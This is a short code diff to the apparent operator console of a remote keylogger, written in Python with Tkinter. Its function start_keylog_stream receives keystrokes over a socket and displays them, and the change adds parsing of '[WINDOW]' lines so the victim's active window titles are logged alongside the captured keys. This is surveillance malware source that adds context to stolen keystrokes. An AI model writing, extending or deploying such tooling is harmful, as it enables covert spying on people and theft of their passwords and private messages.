@@ -516,6 +516,15 @@ def start_keylog_stream():
                         _keylog_buffer.append(ts_key)
                         g.root.after(0, lambda k=ts_key: g.terminal_output.insert(tk.END, f"  ⌨️ {k}\n", "keylog"))
                         g.root.after(0, lambda: g.terminal_output.see(tk.END))
+                    elif line.startswith("[WINDOW]"):
+                        ts_win = line[len("[WINDOW]"):].strip()
+                        parts = ts_win.split(" ", 1)
+                        if len(parts) == 2:
+                            ts = parts[0]
+                            title = parts[1]
+                            _keylog_buffer.append(f"\n--- [{ts}] 🪟 {title} ---")
+                            g.root.after(0, lambda t=title: g.terminal_output.insert(tk.END, f"\n🪟 [{t}]\n", "output"))
+                            g.root.after(0, lambda: g.terminal_output.see(tk.END))
             except socket.timeout:
                 continue
             except (OSError, ConnectionError):
